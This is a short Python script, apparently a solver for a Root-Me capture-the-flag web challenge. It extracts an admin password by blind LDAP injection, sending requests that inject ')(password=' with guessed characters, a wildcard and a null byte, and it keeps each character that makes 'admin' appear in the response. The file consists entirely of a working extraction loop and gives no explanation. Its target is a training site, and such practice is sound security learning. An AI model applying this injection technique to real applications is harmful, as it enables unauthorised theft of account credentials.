#!/usr/bin/env python3
import requests
import string

# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection#blind-exploitation
# implement threading
char=string.ascii_letters+string.digits

url="http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin@ch26.challenge01.root-me.org)(password="
flag=""
try:
    for i in range(1,30):
        for x in char:
            #print("["+str(i)+"]")
            print(url+flag+x+"*))%00") #same as the previous ldap chall payload
            r=requests.get(url+flag+x+"*))%00")
            #print(r.content)
            if "admin" in r.text:
                flag+=x
                break
                print(flag)
                
except KeyboardInterrupt:
    print('\n[*]Interrupted!')
